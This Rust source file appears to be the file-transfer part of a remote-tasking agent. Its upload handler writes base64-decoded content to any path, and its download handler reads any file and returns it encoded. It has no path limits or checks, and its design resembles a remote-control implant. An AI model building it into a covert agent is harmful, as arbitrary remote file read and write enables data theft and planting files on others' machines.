//! File Operations - upload/download handlers for built-in commands

use crate::protocol::AgentMessage;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use std::fs;
use std::io::{Read, Write};
use std::path::Path;
use std::sync::mpsc::Sender;

/// Handle `upload` command: decode base64 content and write to remote_path
pub fn handle_upload(task_id: &str, payload: &str, sender: &Sender<AgentMessage>) {
    #[derive(serde::Deserialize)]
    struct UploadPayload {
        remote_path: String,
        content_base64: String,
    }

    let parsed: UploadPayload = match serde_json::from_str(payload) {
        Ok(p) => p,
        Err(e) => {
            let _ = sender.send(fail(task_id, format!("invalid payload: {e}")));
            return;
        }
    };

    let content = match STANDARD.decode(&parsed.content_base64) {
        Ok(c) => c,
        Err(e) => {
            let _ = sender.send(fail(task_id, format!("base64 decode failed: {e}")));
            return;
        }
    };

    let result = write_file(&parsed.remote_path, &content);
    let _ = sender.send(match result {
        Ok(()) => AgentMessage::TaskResult {
            task_id: task_id.to_string(),
            success: true,
            output: format!("uploaded {} bytes to {}", content.len(), parsed.remote_path),
        },
        Err(e) => fail(task_id, e),
    });
}

/// Handle `download` command: read file and return base64-encoded content
pub fn handle_download(task_id: &str, remote_path: &str, sender: &Sender<AgentMessage>) {
    let result = read_file(remote_path);
    let _ = sender.send(match result {
        Ok(content) => {
            let encoded = STANDARD.encode(&content);
            AgentMessage::TaskResult {
                task_id: task_id.to_string(),
                success: true,
                output: encoded,
            }
        }
        Err(e) => fail(task_id, e),
    });
}

/// Check if a command is a built-in file operation
pub fn is_file_op(command: &str) -> bool {
    matches!(command, "upload" | "download")
}

fn write_file(path: &str, content: &[u8]) -> Result<(), String> {
    let p = Path::new(path);
    if let Some(parent) = p.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).map_err(|e| format!("create_dir failed: {e}"))?;
        }
    }
    let mut file = fs::File::create(p).map_err(|e| format!("create failed: {e}"))?;
    file.write_all(content)
        .map_err(|e| format!("write failed: {e}"))?;
    Ok(())
}

fn read_file(path: &str) -> Result<Vec<u8>, String> {
    let mut file = fs::File::open(path).map_err(|e| format!("open failed: {e}"))?;
    let mut buf = Vec::new();
    file.read_to_end(&mut buf)
        .map_err(|e| format!("read failed: {e}"))?;
    Ok(buf)
}

fn fail(task_id: &str, detail: String) -> AgentMessage {
    AgentMessage::TaskResult {
        task_id: task_id.to_string(),
        success: false,
        output: detail,
    }
}
